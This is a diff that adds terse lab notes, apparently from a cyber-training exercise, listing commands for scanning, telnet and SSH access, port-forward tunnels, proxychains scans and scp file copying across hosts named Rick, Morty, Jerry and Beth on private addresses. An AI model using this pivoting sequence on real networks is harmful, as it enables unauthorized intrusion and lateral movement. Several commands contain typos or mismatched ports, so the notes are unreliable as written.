@@ -1,0 +1,48 @@
+rick and morty
+                                                                              10.50.87.199-Rick-23,80/////10.1.2.17/28////10.1.2.18-21,80,2222
+BIH> nmap -T4 -sV -O 10.50.87.199 (term1) (10.50.87.199-??-23,90)
+BIH> wget -r Http://ip
+BIH> telnet 10.50.87.199
+RICK> ip addr (10.1.2.17/28 internal)
+RICK> ls /usr/share/cctc
+RICK> ssh student@10.50.12.130(float ip) -R 22301:localhost:22
+BIH> scp -P 22301 Rick@localhost:/usr/share/cctc/* 10.50.87.199/
+TERM2
+BIH> ssh Rick@localhost -p 22301 -D 9050
+(RICK>)
+TERM3
+BIH> proxyscan.sh (10.1.2///13-32///21-23 80)
+BIH>proxychain wget -r http/ftp://<ip>
+BIH>proxychain ./scan.sh (10.1.2.18/// 1024-5000)
+BIH> nc 10.1.2.18 2222
+TERM1 tear down tunnel-exit
+TERM2 tear down dynamic tunnel-exit
+Term1
+Rick ssh student@floatip -R 22301:10.1.2.18:2222
+Term3 
+ssh Morty@localhost -p 22301
+morty> ls /usr/share/cctc
+TERM4
+scp -P 22301 Morty@localhost:.usr/share/cctc/* 10.1.2.18/
+TERM 3
+morty> ip addr
+exit
+TERM5 
+ssh Morty@localhost -p 22301 -D 9050
+Term4
+BIH> prozychains ./scan.sh (new internal ip network)
+BIH> proxychains wget -r http/ftp:// ips 
+BIH> proxychains ./scan.sh (ips 1024-5000)
+BIH. proxychains nc 172.16.10.121 2323
+TERM5
+tear down dynamic tunnel - exit
+BIH> morty@localhost -p 22301 -L 22302:172.16.10.121:2323
+Term 4
+BIH> ssh Jerry@localhost -p 22303 -D 9050
+Jerry> ip addr (192.168.10.71/26)
+Term6 
+BIH> scp -P 22302 Jerry@localhost:/usr/share/cctc/* 172.16.10.121/
+BIH proxychains ./scan.sh
+BIH>proxychains wget -r http/ftp://ip
+BIH> proxychains ssh Beth@192.168.10.71
+Beth> ip addr
